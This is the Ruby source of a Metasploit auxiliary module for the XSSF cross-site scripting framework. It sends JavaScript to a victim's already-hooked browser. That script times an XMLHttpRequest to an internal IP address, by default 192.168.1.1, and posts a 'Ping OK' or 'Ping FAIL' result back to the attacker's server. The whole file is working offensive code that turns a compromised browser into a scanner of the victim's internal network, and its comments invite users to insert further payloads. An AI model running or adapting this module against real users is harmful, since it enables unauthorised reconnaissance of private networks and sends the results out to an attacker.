require 'msf/core'
require 'msf/base/xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Ping',
			'Description' => 'Simple ping done by victim'
		))
		
		register_options(
			[
				OptAddress.new('address', [true, 'IP adress to ping', '192.168.1.1'])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)	
			code = %Q{
				function AJAXInteraction(url) {
					var d = new Date;
					XSSF_XHR.onreadystatechange = processRequest;
				 
					function processRequest () {
						if (XSSF_XHR.readyState == 4) {
							var d2 = new Date;
							var time = d2.getTime() - d.getTime();

							if (time < 18000)
								if (time > 10)
									XSSF_POST("Ping OK : " + url, '#{self.name}');
								else
									XSSF_POST("Ping FAIL : " + url, '#{self.name}');
							else
								XSSF_POST("Ping FAIL : " + url, '#{self.name}');
						}
					}
				 
					this.doGet = function() {
					  XSSF_XHR.open("GET", url, true);
					  XSSF_XHR.send();
					}
				}
				 
				var ai = new AJAXInteraction('#{datastore['address']}');
				ai.doGet();
			}

		send_response(cli, code)
	end
end